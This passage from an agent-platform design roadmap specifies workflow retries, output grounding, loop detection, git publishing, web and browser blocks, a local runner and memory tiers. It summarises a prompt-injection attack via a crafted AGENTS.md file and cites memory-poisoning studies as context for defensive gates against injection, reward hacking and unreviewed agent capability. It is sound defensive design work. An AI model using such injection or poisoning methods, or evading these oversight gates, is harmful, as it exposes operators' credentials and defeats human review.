**Decided:** the feedback loop is the defining feature of this entry. If it does not work, the tier is
not done.
**Retry semantics against a mutated workspace — specify this, do not inherit it.** Temporal activities
are **at-least-once**, and a block that writes files is not idempotent. A code-writer retried after
partial work wakes up in a workspace containing its own half-finished edits, with no way to tell them
from the starting state. Three options, and the entry must pick one per block rather than leaving it to
chance: **reset** (restore the tree to its pre-block state and start clean — correct default for
mutating blocks; implemented deterministically by recording pre-block commit/tree SHAs before execution, executing `git clean -ffd && git reset --hard <sha>`, and in the event of `.git` metadata corruption, re-hydrating the workspace tree via zero-copy hardlinks from the in-cluster bare mirror (2.3/2.4)), **resume** (re-enter with the partial state visible and explicitly described in the
input), or **no-retry** (fail straight to the orchestrator). Publishing (4.7) is separately protected
by idempotency, but everything upstream of it needs this answered.
**Decided:** this entry is **selection and execution of predefined workflows only** — the orchestrator
picks a graph, it does not invent one. Dynamic planning is 4.12 and deliberately comes second: the
predefined path is reviewable before it runs, trivially bounded, and cheap to evaluate, so it should
be the one that works first and stays the default. An earlier draft of this entry conflated the two,
which would have produced an execution engine with no clear contract.
**Decided: workflows nest.** A workflow may appear as a node inside another workflow, so "run the QA
sub-workflow" is expressible directly and composition scales past flat graphs. Two consequences that
are part of this entry, not afterthoughts: a **nesting depth bound** enforced by the engine and
counted against 6.4's limits, and **cycle detection at definition time** so a workflow cannot
transitively contain itself. A nested workflow's failure surfaces to its parent as a routable outcome
like any other block's, which is what keeps the 4.6 feedback loop working through nesting rather than
around it.

#### 4.6b — Output grounding check
**Goal:** A block's claim about what it did is checked against what actually happened.
**Depends on:** 4.6, 4.3.
**Done when:** after a block completes, the engine captures observable workspace state (`git status
--porcelain`, `git diff --stat`, exit codes, files touched versus the block's declared path set) and
compares it against the block's structured output; a mismatch — "updated the config" with no diff, a
success claim with a non-zero exit — is a **routable failure** the orchestrator handles like any other,
not a silent pass; secrets are redacted from any captured delta before it reaches a model or a log.
**Decided: keep the deterministic half, reject the LLM-probe half.** The archived design paired
auto-delta capture with LLM-generated shell probes gated by a `bashlex` AST allowlist. The probes are
premature — they add an inference hop, a sanitiser to maintain, and a new injection surface, to catch
claims that the deterministic delta already catches most of. Dropping them removes the AST sanitiser
entirely, since it existed only to police probes we are no longer generating.
**Why this is needed at all, given 4.6's feedback loop.** Much of the verification happens structurally
already — a writer block's claim is checked by the test block after it. The residual gap is a block
whose output nothing downstream verifies: it asserts success, the orchestrator believes it, and the run
proceeds on a false premise. This closes that, cheaply and without a model call.
**Decided:** JSON schema validation is enforced deterministically by the model provider. LiteLLM supports
Structured Outputs (`response_format` tied to a JSON Schema) for all frontier models. The model is
constrained at the token-generation level to only output valid JSON. Fallback for older models is
LiteLLM's `json_mode` plus 1 automatic retry loop in the orchestrator before escalation.
#### 4.6c — Runaway Agent Loop Detection
**Goal:** The engine detects and escalates LLM semantic attractor loops before they exhaust tokens or crash the system, enforcing cooperative and forceful kill semantics.
**Depends on:** 1.1a, 4.6.
**Done when:** the AST stream of the Temporal Activity executing LangGraph (`run_langgraph_workflow`) intercepts semantic repetition heuristically or via local `Score` evaluation; a detected loop immediately raises a non-retryable `RunawayAgentException`; the orchestrator catches this and escalates to the review queue without paralyzed retrying; and `recursion_limit` is explicitly configured to prevent hard framework crashes.
**Decided: Intercept at the Graph Layer, not just the model.** LangGraph's native `recursion_limit` acts as a blunt circuit breaker that wastes the entire token budget before causing an ungraceful 500 error. Instead, the engine inspects the `astream(stream_mode="values")` output on each Temporal heartbeat.
**Decided (Research: `hack/research/feat-research-1727042000-jev-laya-decision-models.md`): Use a local System 1 model (Laya) as a semantic sidecar, replacing the heuristic sequence matcher.** Heuristics are fragile. A 421M parameter model (like Laya) embedded as a Temporal worker sidecar can execute a similarity/repetition `Score` primitive on the SNO CPU in ~50-150ms (memory-bandwidth bound, well within the 30GB idle budget). This provides fast, zero-network-call semantic loop detection without stalling the Temporal event loop.
**Decided: Orchestrator-level state-aware retries, NEVER blind Activity retries.** The Temporal Activity treats `RunawayAgentException` as a `non_retryable_error_types`. Blind Temporal retries are structurally prohibited for LLM loops, as the identical context window guarantees the exact same hallucinated loop. Instead, the orchestrator catches the failure and may attempt a strict, bounded retry. This retry MUST be state-aware: it resets the workspace (`git clean -ffd && git reset --hard <sha>`) per 4.6, and mutates the context (e.g., injecting a loop-warning system prompt or failing over to a new logical model). If the bounded orchestrator retry is exhausted, it strictly obeys **I15** and escalates to the 6.1 pending queue.
**Decided: Token-level loop prevention.** LiteLLM logical models used by agentic blocks enforce a baseline `presence_penalty` (e.g., `0.4`) to mathematically decay semantic repetition likelihoods.
**Research Basis:** Detailed in `hack/research/feat-research-runaway-agent-detection.md` (synthesizing Erlang/OTP supervisor maximum restart principles, text degeneration metrics, and Temporal streaming heartbeat best practices).

#### 4.7 — Git publish block
**Goal:** The single, deterministic place where work leaves the cluster and reaches GitHub.
**Depends on:** 4.3, 2.6, 2.3, 1.1c.
**Done when:** a non-LLM block executes an un-bypassable Pre-Flight sequence: `1. Query Upstream Policy (GraphQL/REST) -> 2. Evaluate Platform Shadow Policy -> 3. Rebase -> 4. Check Conflicts -> 5. Push`. It takes a local branch from the task workspace, obtains a scoped short-lived token from the broker (2.6), and opens or updates a PR; if intent conflicts with upstream branch protection (mutually exclusive) or platform shadow policy, it fails fast with a `ToolError` for re-planning instead of executing the push; it records the resulting PR URL and SHA as run artifacts; and it triggers a refresh of the 2.3 mirror so the next task sees the new commits.
**Decided:** deterministic, not an LLM block. This is the one component with write access to the
outside world, so its behaviour must be fully specified and auditable rather than model-generated. LLM
blocks produce commits; this block publishes them. Commit messages and PR bodies arrive as **input
variables** from upstream blocks — the publish block composes nothing itself.
**Multi-repo publishing is a saga, not a transaction.** When a task touched several repos, this block
opens **dependency-ordered coordinated PRs** — libraries before consumers, order derived from the
parsed graph — links them to each other and to the task, and tracks the set until all land. The
intermediate state where some have merged and some have not is **normal and must be visible**, not
hidden or retried into consistency. Nobody has solved atomic cross-repo landing; don't build an
abstraction that implies otherwise.
**Decided: Sagas halt on TOCTOU Rebase-and-Resolve loops.** If any repository in a cross-repo campaign enters a `wait_condition` or hits a merge conflict during the Rebase-and-Resolve loop, the campaign acts as a **Saga Barrier**. All downstream dependent repos in the saga automatically suspend execution until the upstream conflict is fully signed off and merged.
**Trap — publishing is the blast-radius boundary.** Everything before this block is contained inside a
sandbox that gets destroyed. This block makes changes durable and external. Pair it with 4.11.
**Trap — lockfile portability.** A lockfile regenerated inside a sandbox bakes in **our mirror's URLs**,
because metadata-rewriting mirrors (Verdaccio, Nexus, `git-pkgs/proxy`) rewrite artifact URLs to point
back through themselves. Pushing that lockfile hands the user a file nobody outside the cluster can
resolve. Bun is worst here — open bugs #35524 and #24245 rewrite the `resolved` URL for the *entire*
locked graph and the change is sticky across future installs. **Decided (Lockfile portability):** This block deterministically rewrites internal mirror URLs back to canonical upstream public registry URLs (e.g., `registry.npmjs.org`, `pypi.org`, `crates.io`) before publishing. If a lockfile contains internal URLs that cannot be mapped to a known public upstream, the publish block fails fast and alerts the operator rather than pushing broken lockfiles.
**Open:** whether mirror refresh is triggered synchronously here or left to the next poll cycle.
Synchronous costs latency; webhook-only risks a following task reading a stale mirror.

#### 4.8 — GitHub checks block
**Goal:** CI results become orchestrator-routable data, and reruns are a first-class action.
**Depends on:** 4.7, 4.6, 1.9.
**Done when:** a deterministic block polls check-run and status state on a
PR; it distinguishes pending, passed, failed, and infrastructure-error outcomes; **failure output —
the failing job's logs, not just its name — is captured as structured input the orchestrator can feed
back to the block that caused it**, exactly as pre-commit failures are in 2.4; it can request a rerun
of a specific failed check; rerun attempts are bounded and counted so a flaky check cannot loop
forever; exhausting the bound escalates to the pending queue (6.1) rather than failing silently.
**Decided:** pairing rerun with a hard attempt bound in the same entry. An unbounded rerun loop against
a genuinely broken check burns API quota and model spend with no path to termination.
**Decided:** polling, not webhooks — see the no-inbound invariant in Part 2 and the endpoint guidance
in 5.6. This entry consumes the same poller.
**Open:** distinguishing a flaky check from a real failure is a judgment call; decide whether that
stays deterministic (rerun once, then escalate) or consults the orchestrator.

#### 4.9 — First-party block and persona library
**Goal:** An orchestrator has a useful set of blocks to compose on day one, not an empty palette.
**Depends on:** 4.4, 4.3, 4.7, 4.8.
**Done when:** a starter library ships as seeded, editable definitions: **code writer, code QE/test
author, code reviewer, virtual user** (exercises a change the way a real user would and reports what
broke), researcher, and summariser — plus the deterministic blocks from 4.3/4.7/4.8. Each has a
versioned system prompt, declared typed inputs, a logical model reference, and a declared workspace
mode. They are seeds the operator edits, not immutable built-ins.
**Decided:** these were named in the original request ("a code writer, code QE, virtual user, etc",
"a whole host of buildable agents/workflows that an orchestrator can use") and had no entry. A block
*primitive* without a block *library* is a toolkit, not a platform — the orchestrator in 4.6 has
nothing to orchestrate until this exists.
**Seeded workflows come from proven orchestrations, not invented ones.** The operator's `code-quality`
plugin already contains multi-agent pipelines that work in practice; the seed library is those shapes
rather than guesses. Five, and each exercises a different part of the engine:
- **Code-change loop** — write → test → review → commit → publish → check CI → loop on failure. The
  shape 4.6's feedback loop exists for, and the one that proves the whole tier.
- **Fresh-context review** — reviewers spawned with no visibility into the authoring context, several
  distinct lenses, blocking on findings. This mode explicitly includes **"Veto Override Verification"** for `arma-veto` test deletions. **Our isolated-clone workspace mode (4.5) is precisely the
  substrate for this**, which is a strong signal the workspace design is right.
- **Generate → verify** — a second stage whose only job is confirming or refuting the first's findings,
  filtering false positives before anything acts on them.
- **Competition and judge** — N candidate implementations in isolated clones, a judge selects one.
  Another direct consumer of isolated workspaces, and a natural fit for nested workflows (4.6).
- **Chunk → map → reduce** — parallel workers over a partitioned workload, one reducer synthesising.
**Two structural lessons from the same source, already reflected elsewhere and worth noting as
convergent evidence:** those pipelines tier their models by judgment load (expensive for architecture
and plan reconciliation, cheap for mechanical high-volume work), which is exactly what the Agent
entity's logical model reference enables; and they separate always-on guardrails from manually invoked
pipelines, which maps to the trigger taxonomy in 5.6.
**Scoping follows I5** — personas are catalogue entities like any other: defined once, `global` or
bound to specific projects. Not an override model; see the note in 4.3b.

#### 4.9b — External content blocks: search, fetch, and browser
**Goal:** Agents can reach the web, through a boundary that keeps the sandbox offline and treats every
byte returned as hostile.
**Depends on:** 4.3, 6.5, 3.1.
**Done when:** three blocks exist —
- **`web_search`** with **pluggable providers behind a logical name**, exactly as 1.3 does for models:
  the block asks for "search," the platform routes to a configured provider with fallback (Gemini
  grounding, DuckDuckGo, Brave, others). Provider choice becomes config, not a block rewrite.
- **`web_fetch`** with an **escalation ladder**: plain HTTP first; on bot-blocking, a JS-required page,
  or an empty render, escalate to the browser block rather than failing. Report which tier served the
  content, because "fetched" and "rendered" have different trust and cost profiles.
- **`browser_automate`** — headless Playwright for JS-heavy pages and genuine interaction. **Captures a
  downscaled but legible screenshot before each navigation or state-changing action**, stored as a run
  artifact, so there is a visual record of what the agent saw before it acted. Screenshots are
  compressed hard: image tokens are expensive, and the goal is auditability, not fidelity.

**Decided: these run platform-side, not in the sandbox.** The sandbox stays offline. A fetch block
executing inside it would require punching egress through 2.5 for arbitrary destinations, discarding <!-- lint:no-dep 2.5 -->
the property that entry exists to create. Instead the block runs as a platform service with its own
narrow egress policy and returns *content* to the sandbox. Bonus: one browser pool serves every task
rather than a browser per workspace, which matters at ~500MB–1GB resident each.
**Decided: fetched content is untrusted input and routes through 6.5.** This is the highest-volume
injection vector in the platform — a fetched page is attacker-controlled text heading into a model's
context. Delimited, marked untrusted, and any turn that ingested it gets elevated approval for
subsequent tool calls.
**A fourth block, distinct from the Slack *client* in 7.7: Slack as a read-only data source.** 7.7 is
Slack as an interface the operator talks through. This is Slack as a place to *look things up* —
querying history, watching for mentions — in workspaces where no app can be installed, which is the
common case for an employer's workspace. Where an app *can* be installed, use the official API and
stop there. Where it cannot, the only route is a browser session, which `summon-claude` implements by
driving headless Playwright and intercepting the web client's WebSocket.
**Flagged honestly, because this one has real costs the others don't:** automating a Slack web session carries ToS risks, but this is a hard requirement. The architecture MUST ensure security leaks of auth cookies cannot occur, treating this as a strictly isolated execution (it MUST run under the elevated Tier 2.7 Kata isolation, never standard runc), and that is the operator's call to make knowingly, not a
detail to bury; it requires holding real workspace credentials in a browser profile, which is a
materially different credential exposure from an API token; and it is brittle by construction, since a
front-end change can break it silently. Treat the scraped path as a last resort behind an explicit
per-workspace opt-in, and treat everything it returns as untrusted input under 6.5 — a Slack message is
attacker-controlled text from the platform's point of view.
**Open:** whether search results (snippets) and fetched bodies get different trust classes — a snippet
is shorter and lower-risk but is still attacker-influenced via SEO. Screenshot downscaling parameters
need measuring against real pages: readable-but-cheap is an empirical target, not a guess.

#### 4.9c — Local runner
**Goal:** A remote agent can act on the operator's own machine, deliberately and visibly.
**Depends on:** 4.1, 6.2, 2.2, 1.10.
**Hard gate:** 1.10 is not merely a dependency — **this entry must not ship before Temporal has
authentication**, because it puts a polling worker on a personal machine.
**Done when:** a small process runs on the operator's machine, **joins as a Temporal worker in its own
dedicated namespace** with a credential scoped to that namespace, and executes a restricted activity
set; blocks target it explicitly; the operator sees a persistent indicator while it is connected; every
action passes 6.2 and is audited; it exits cleanly and the queue drains.
**Corrected: namespace isolation, not task-queue isolation.** An earlier draft said "a dedicated,
per-machine task queue," which reads like a boundary and is not one — Temporal's `CallTarget` has no
task-queue field, so **a worker credential that can poll one queue can poll every queue in its
namespace**. A compromised laptop would have had reach over all platform work. Per-namespace is the
finest isolation the shipped authorizer actually enforces.
**Accept the residual risk explicitly:** because every Poll/Respond API is classified `AccessWrite`,
the laptop's credential necessarily also permits starting, signalling, and terminating workflows *in
its own namespace*. There is no shipped way to grant "may execute tasks" without "may destroy
workflows." Keeping that namespace empty of anything else is what bounds the damage.
**Decided: a Temporal worker, not a remote-control agent.** This is the architecturally cheap answer
and it preserves the no-inbound invariant exactly — a worker **polls outbound**, so the laptop needs no
inbound path, no tunnel, and no port. The repo's existing `scripts/local_worker.py` already had this
shape (an MCP tool provider plus a Temporal worker on a `local-mcp-queue`); the shape was right even
though the surrounding design changed.
**Decided: scoped allowlist, opt-in per session, never ambient.** A remote agent driving a personal
machine is the single highest-trust capability in the platform. It is off by default, armed
**Decided (Research: `hack/research/research-1726915200-macos-local-llm-sandbox.md`): Reject container sandboxing; embrace host-level execution.** The research recommended containers, but that fundamentally breaks the operator's actual use cases: troubleshooting local installations, migrating host data/configs, and validating local backups. The local runner is purposefully designed to interact with the host, not to merely borrow compute.
**Activity Set:** Host-level access, including unrestricted shell execution (`run_bash_locally` or equivalent host-level MCP servers).
**Security Model:** Because we are deliberately abandoning technical isolation (sandboxing) for utility, the boundary must be 100% **Consent and Visibility**. The security model strictly relies on the Temporal HITL approval queue (6.1). Per 6.3, local runner host execution is structurally prohibited from AFK auto-approval; a remote LLM can propose a host command, but the local worker will never execute it without explicit, physical out-of-band human confirmation.

#### 4.10 — Artifact lifecycle and data retention
**Goal:** The platform does not fill its own disk.
**Depends on:** 4.2, 1.8.
**Done when:** artifacts, run history, and traces have explicit retention policies, configurable per
project; a reaper enforces them; large artifacts are size-capped at write with a clear failure rather
than silent truncation; storage consumption is visible in 1.8's dashboard and alerts before exhaustion.
**Decided:** single node, finite disk, and every block run produces artifacts. This is a
when-not-if operational failure, and it fails in the worst way — the platform wedges while appearing
healthy, and the thing that would tell you is the observability stack that just lost its disk.
**Decided: audit rows are exempt from the reaper and retained separately.** 2.6, 3.2, 6.2, 6.3, 4.11,
and 1.10 all write audit records, and a retention policy written for artifacts would quietly eat the
evidence of who approved what. Audit retention is set independently, deliberately longer, and the
records are **append-only** — a reaper that can delete an audit row is a reaper that can erase an
AFK-mode decision nobody reviewed yet.

#### 4.11 — Task revert and blast-radius containment
**Goal:** A task that went wrong can be undone.
**Depends on:** 4.7, 4.6, 1.9.
**Done when:** every run records exactly what it changed outside the sandbox — branches pushed, PRs
opened, comments posted, external side effects; a revert action closes/reverts those in one operation;
what is *not* revertable is stated explicitly rather than silently assumed; revert itself is audited.
**Decided:** this gap was created by an earlier decision. Rejecting jj gave up its operation log, which
was the best per-repo undo story surveyed — and no alternative was put in its place. Inside the
sandbox, isolated clones contain damage and pod destruction cleans up. Once 4.7 pushes, nothing does.
An autonomous platform with AFK mode (6.3) making binding decisions needs an undo that does not depend
on the operator reconstructing what happened from a run log.

#### 4.12 — Dynamic task planning
**Goal:** A task with no matching workflow still gets done.
**Depends on:** 4.6, 4.9, 6.4.
**Done when:** when no library workflow matches, the orchestrator composes a block sequence from the
available library for this task; the generated plan is recorded as a first-class artifact before
execution so it can be inspected, replayed, and compared; it is bounded by the same retry, depth, and
spend limits as any other run (6.4); a plan that repeatedly fails escalates to the queue rather than
replanning indefinitely; a dynamic plan that proves useful can be promoted into a library workflow
via 4.13.
**Decided:** the fallback path, not the default. Every dynamic run is a fresh non-deterministic plan —
harder to bound, predict, and evaluate — so it handles novel work while 4.6 handles known shapes.
**Decided:** the planner composes from **existing** blocks only. Inventing new blocks is 4.13 and
requires approval; planning must not become a side channel for unreviewed capability.
**Open:** how "no workflow matches" is decided — a confidence threshold on workflow selection, or an
explicit no-match signal. A planner that silently prefers replanning over a perfectly good library
workflow defeats the point of having a library.

#### 4.13 — Definition proposal and approval
**Goal:** The platform extends its own capabilities, but never without review.
**Depends on:** 4.9, 6.1. *(API-first; Authoring UI integration is provided when Tier 7 ships).*
**Done when:** an orchestrator that finds no adequate block or workflow can **propose** a new
definition — system prompt, typed inputs, model reference, workspace mode — which lands in the pending
queue (6.1) as a reviewable diff; it cannot execute before approval; on approval it joins the library
as a versioned definition like any hand-authored one; rejections are recorded with the reason so the
same proposal is not re-litigated every run.
**Decided:** same shape as memory promotion in 5.2 — **agents propose, humans dispose** — and
deliberately so, because it is the same risk: an LLM writing instructions that another LLM will later
execute with tool access. Approval-gated means every capability in the system was reviewed by a human
before its first run, while the library still grows from real use rather than only from anticipation.
**Decided:** AFK mode (6.3) **cannot** approve definition proposals or new capabilities. It cannot
extend what the platform can do. Approval of new blocks or workflows is the one place AFK mode is
deliberately powerless, requiring a human review.


#### 4.14 — Project Validation: Fast/Slow Execution & Drift Detection
**Goal:** The platform automatically discovers, classifies, and executes project-specific code quality standards safely.
**Depends on:** 1.1b, 6.1.
**Done when:** an onboarding workflow prompts the user to select the `workflow_mode` (`fork` vs `direct`); if `direct` is selected, the platform automatically recommends enabling `shadow_policies` for `main` to prevent the agent from making autonomous, destructive same-repo pushes; it parses repository configs (`Makefile`, `package.json`, `pre-commit-config.yaml`, `tox.ini`) to propose an initial **Project Validation Pipeline**; a background drift-detection supervisor runs `git diff --name-only` to detect config drift, proposing pipeline updates to the 6.1 queue; failures in async `slow` checks emit signals to the Project Supervisor to spawn new bug-fix tasks.
**Decided:** Dynamic configuration replaces hardcoded `pre-commit` assumptions. This guarantees the platform adapts to disparate project ecosystems while preventing arbitrary, unapproved execution loops.
**Decided:** Changes to the Validation Pipeline are treated exactly like Definition Proposals (4.13): **agents propose, humans dispose.**

#### 4.15 — Mechanical Defenses: AST Veto, Log Reduction & Deterministic Dependencies
**Goal:** The platform defends against LLM reward hacking, context window exhaustion, and dependency deadlocks.
**Depends on:** 4.14, 2.5, 1.3.
**Done when:** the orchestrator executes a deterministic structural AST Linter (`arma-veto` equivalent) post-generation; any agent-driven test deletion or `skip` injection halts the pipeline and escalates to a Code-Reviewer Agent for verification; massive raw failure logs are reduced using a 3-step pipeline: test framework JSON (`pytest-json-report`) → Context Extraction (`grep-ast` / `tree-sitter`) → Heuristic Truncation (`sentry-sdk` stacktrace parsing) → Map-Reduce via a fast logical model to produce a strict JSON failure summary; dynamic dependencies are safely resolved via a **`request_dependency`** tool that yields the LLM, executes a deterministic platform block to pull the package into the 2.5 mirror, and resumes the sandbox.

## Tier 5 — Memory and supervision

#### 5.1 — Platform memory store and sandbox read path
**Goal:** Durable project memory lives in the platform, reaches every block, and never touches the
user's repositories.
**Depends on:** 1.1, 2.1.
**Done when:** Postgres tables exist for three tiers — `memory_episodic` (append-only task/session
events), `memory_semantic` (architecture, decisions, gotchas), `memory_procedural` (principle-level
lessons) — each carrying `scope_type`/`scope_id` (global / project / task / agent_role), full provenance
(writing block, run, trust class), and `valid_from`/`superseded_at`/`supersedes_id`; retrieval is
Postgres full-text (`tsvector`/`pg_trgm`); memory is delivered to a sandbox by **staging read-only files
into the pod at provisioning time, outside the git working tree**; the durable content currently in
gitignored `hack/PROJECT.md` and `hack/LESSONS.md` migrates in (read → migrate → verify → then remove).

**This entry replaces a rejected design.** The previous plan committed `AGENTS.md` and `.agent-memory/`
into each project repo so memory would travel to clones for free. That **exfiltrates platform-internal
agent work into the user's repositories, including public ones** — the mechanism achieving the
convenience *was* the leak. It is also a demonstrated attack surface, not a theoretical one: OpenAI's
own Codex Cloud docs and third-party research (Backslash Security, July 2026) show that agent-read
in-repo instruction files are followed without validation, making credential exfiltration via a crafted
`AGENTS.md` trivial when network access is on.

**Decided: Postgres plus a designed schema. No memory framework.** Surveyed and rejected — Letta
(disruptive 2026 rewrite, per-agent identity only, no project scoping), mem0 (flat tag scopes, app must
enforce isolation), **Zep Community Edition (deprecated in 2026 — self-hosting now means operating
Neo4j/FalkorDB yourself)**, Cognee (best tenancy model of the group, but solving a multi-tenant-SaaS
problem we do not have). Each would add a second stateful service with its own upgrade cadence to
re-implement "agent-editable rows in a database" that we already have the primitives for. Treat every
vendor benchmark as disputed: a third-party reproduction scored 73.8% where the vendor claimed 93.4%
on the same benchmark.

**Decided: no vector search at launch.** At hundreds-to-low-thousands of facts per project the evidence
does not support it. **Anthropic chose filesystem-and-grep over a vector database for its own agent
memory product**, explicitly because such a store "can be opened, read, diffed, and code-reviewed."
A 2026 LlamaIndex benchmark found filesystem access matching or beating embedding retrieval at this
scale, after which Vercel removed ~80% of specialised retrieval tooling from a production agent.
`pgvector` and Apache AGE both bolt onto the *same* Postgres later if evidence demands — no new
infrastructure, no decision needed now.

**Decided: pre-fetch at provisioning, not an MCP call mid-task.** Codex Cloud, Jules, and Devin all
inject context at container start rather than serving it on demand. An MCP read mid-task reopens a live
network path from inside an otherwise-offline sandbox and adds an interactive surface to defend. Scope
the pre-fetch to project semantic + procedural memory plus a token-budgeted slice of recent episodic
entries. Keep an on-demand read tool as an escape hatch only if the pre-fetched slice proves
insufficient in practice.
**Platform-wide memory is a first-class scope, not a per-project duplicate.** Facts like "never use
SQLite," "all Python runs through `uv`," "never commit secrets" belong to the operator, not to any
project, and must be stored once and reach every block everywhere. `scope_type = global` handles this
directly: global memory is pre-fetched into every sandbox alongside project memory, and a project may
*extend* it but never silently contradict it — a project fact that contradicts a global one surfaces
as a conflict for review rather than quietly winning. Global procedural memory is also the highest-risk
tier in the store, since one poisoned entry reaches every project; it gets the strictest promotion gate.
**Open:** the token budget for the pre-fetched slice, and whether untrusted-tier tasks (2.7) get memory
at all. Precedence rules when global and project memory disagree.

#### 5.2 — Memory write path, promotion, and consolidation
**Goal:** Agents accumulate learnings continuously without any agent being able to corrupt what the
platform believes.
**Depends on:** 5.1, 1.1a. *(Episodic logging operates immediately; gated promotion to semantic memory connects to 6.1 pending queue as an extension).*
**Done when:** memory writes execute as a **Temporal activity**, idempotency-keyed on block/task ID plus
content hash so workflow replay never double-writes; **raw episodic events write freely** (any block may
append what happened); **promotion of an observation into semantic or procedural memory is gated**;
a scheduled consolidation workflow folds the episodic log — merging duplicates, pruning stale
references, resolving contradictions — and emits a reviewable diff into the pending queue (6.1); every
item carries provenance and trust class.

**Decided: gate promotions, not writes — gating everything is worse than gating nothing.** The
documented failure is approval fatigue: a reviewer approving forty items a day stops reading around the
tenth, which "manufactures confidence." The line that holds: **raw events are immutable facts about
what happened and write freely; interpretations elevated to standing beliefs need a gate**, because
that is where hallucination and poisoning compound. OWASP ASI06 agrees — user-supplied content must
never reach long-term memory without an extraction step in between.

**Decided: signal-filtered auto-promotion, human review only for the ambiguous.** Modelled on
PROJECTMEM (arXiv:2606.12329), the closest prior art and strikingly similar to the operator's existing
`hack/` convention: typed append-only events; **summaries as a pure projection over the event log, so a
summary can never silently diverge from history**; promotion by deterministic signal rather than an LLM
judge (a failed attempt always promotes — the outcome *is* the signal; notes and decisions promote only
when explicitly tagged). Its one non-transferable property is that it git-commits memory into the repo —
the mechanism transfers, the location does not. Route only contradictory or high-blast-radius items to
the human queue.

**Decided: supersede structurally, never decay.** Decay provably fails on the highest-harm case — a
wrong fact retrieved on every call is *reinforced* by each retrieval and never decays. Detect
contradiction **structurally** (same subject and relation, different object), not by similarity:
contradictions can be *more* cosine-similar to the original than genuine duplicates are (0.812 vs
0.800), so similarity thresholds are unreliable by construction. Plain retrieval serves a superseded
value 15–40% of the time; structural supersession drives that to approximately zero. Pair with a cheap
deterministic **verification-on-read** for facts naming a file or function — a grep/exists check, not a
model call.

**Why the gate is not optional.** MINJA achieved 98.2% injection success with *zero* privileged access,
using only ordinary queries. MPBench found that once written, a poisoned entry has up to 92.76% chance
of being acted on later. LLM-based detectors for poisoned entries miss 66%, because each entry is benign
in isolation. No single control stops this — the demonstrated answer is layering: provenance on every
item, trust-aware retrieval, scope isolation with evidence required for promotion, and rollback to a
known-good snapshot.
**Implicit memory is the harder half, and the episodic log is the answer.** An agent reliably records
explicit facts ("this project uses Postgres") and reliably *fails* to record the expensive ones — five
hours of debugging that ended in an understanding nobody thought to write down. The design handles this
by not depending on an agent recognising significance: **the episodic tier captures events
unconditionally and cheaply** — commands run, failures hit, retries, elapsed time, what finally worked —
because raw events write freely and need no judgement. Significance is then inferred *after the fact*
by signal, not asked for up front: repeated failure on the same target, unusual time-to-resolution, a
fix that followed several failed attempts. Those are exactly the patterns PROJECTMEM promotes
automatically, and they are detectable without a model call. The deterministic precheck closes the
loop — when a future block approaches the same file or error, it gets "this was attempted before, here
is what happened" from an exact lookup rather than hoping semantic search surfaces it.
**Corollary:** never prune the episodic log on a schedule that outruns consolidation. It is the only
record of things nobody knew were worth recording.
**Open:** how aggressive the auto-promotion signal filter should be before a human is required. This is
a policy question to tune against real usage, not an architecture question to settle now.

#### 5.2b — Automated Decision Provenance and Grounded Interviews
**Goal:** Decisions made by LLMs, System 1 models, and Humans are captured uniformly without relying on LLM post-hoc rationalization or self-reporting.
**Depends on:** 1.1c, 4.4c, 5.2, 6.1.
**Done when:** Generative LLMs are **relieved entirely** of the burden of self-reporting decisions; Agent Decision Records (ADRs) are standardized across all actors; structural shifts are detected deterministically by diffing the **1.1c cross-repo dependency graph** post-block and comparing it against the initiating prompt; the "Why" is extracted by the 5.2 consolidation workflow pulling the `AIMessage` scratchpad immediately preceding the tool call; a "Grounded Interview" block is spawned if the scratchpad is too terse.
**Decided:** Reject LLM self-reporting at the block boundary. Mandating an LLM to output its own decisions in an exit schema violates Invariant I1 (Enforce at the boundary) and guarantees hallucinated or omitted records.
**Decided:** **The Intent Threshold (`AST_Delta - Prompt_Intent`).** An AST change is not inherently a decision. If the user prompt asked for a new function, the resulting AST node is compliance, not an autonomous choice. The 5.2 consolidation workflow uses the 4.4c System 1 classifier to compare the 1.1c graph diff against the original block prompt. Only unprompted structural shifts (e.g., adding `httpx` to fulfill a request that didn't mention it) trigger ADR extraction.
**Decided:** Never rely on an open-ended "Why did you do this?" interview. Post-hoc rationalization guarantees the LLM will hallucinate a justification. The interview is strictly grounded by feeding the LLM its own episodic `AIMessage` and bounding the prompt to format that specific context into the ADR schema.
**Reference:** See the **[Architecture Design: Automated Decision Provenance](../../hack/research/feat-research-1790250000-llm-decision-tracking.md#architecture-design-automated-decision-provenance)** section of the research document for the complete implementation schema and intent threshold logic.

#### 5.3 — Per-project supervisor
**Goal:** A project has an agent watching whether its work is actually on track.
**Depends on:** 4.6, 5.1, 1.9, 1.1b.
**Done when:** each project can run a supervisor that observes run outcomes against the project's
**stored goals (1.1b)**, surfaces stalled or looping work, and escalates via 1.9; it is configurable
per project and can be disabled.
**"Drift" is defined concretely, not left to judgement.** The supervisor evaluates against signals it
can actually measure: a task open beyond a threshold with no state change; repeated failure of the same
block across runs; spend accumulating against a goal with no merged output; a stated goal with no task
referencing it; work proceeding on a repo binding the goals never mentioned. Each is a rule with a
threshold, not a model asked whether things "feel on track" — otherwise 5.6 turns an undefined
predicate into an autonomous work-creation trigger.
**Decided:** the supervisor **proposes** tasks through 5.7's arbitration like any other agent — it does
not create work directly, even about its own project. It observes and proposes; the arbitration path
is the same one everything else uses.
**Open:** the thresholds themselves, which are empirical. Ship with conservative defaults and tune
against real runs rather than guessing now.

#### 5.4 — Global supervisor and chat entrypoint
**Goal:** One conversational surface over every project.
**Depends on:** 5.3, 1.6.
**Done when:** the dashboard chat talks to a global supervisor with cross-project visibility that can
start tasks, report status, and route to project supervisors; **the fast-path escape hatch works** —
trivial conversational turns with no tools and no state change answer without opening a workflow, and
the boundary is explicit and audited.
**Streams over the Vercel AI Data Stream Protocol (1.6).** Typed parts are what make this surface work:
a dispatched background task renders as a distinct card rather than a sentence in a paragraph, and a
running tool call is visually distinguishable from prose. Conversation state is durable — the
supervisor workflow holds recent turns and a pointer; the transcript lives in Postgres, because
Temporal's history limit makes a long chat in workflow state a hazard (4.1's offload pattern).
**Open:** how far back the supervisor's in-context window reaches before falling back to retrieval, and
whether project supervisors expose the same surface or are reachable only via the global one.

#### 5.5 — Agent evaluation harness
**Goal:** A change to a persona, model, or workflow can be shown to be better or worse, not just different.
**Depends on:** 4.9, 4.6.
**Done when:** a set of recorded tasks with known-good outcomes replays against a candidate
configuration; results report success rate, cost, and latency deltas versus current; runs are
reproducible (pinned inputs, recorded responses where determinism is needed); it gates changes to
first-party personas.
**Decided:** without this, every change to a system prompt or model choice is superstition. The
platform is non-deterministic at its core; "it seemed better" is not a basis for changing the thing
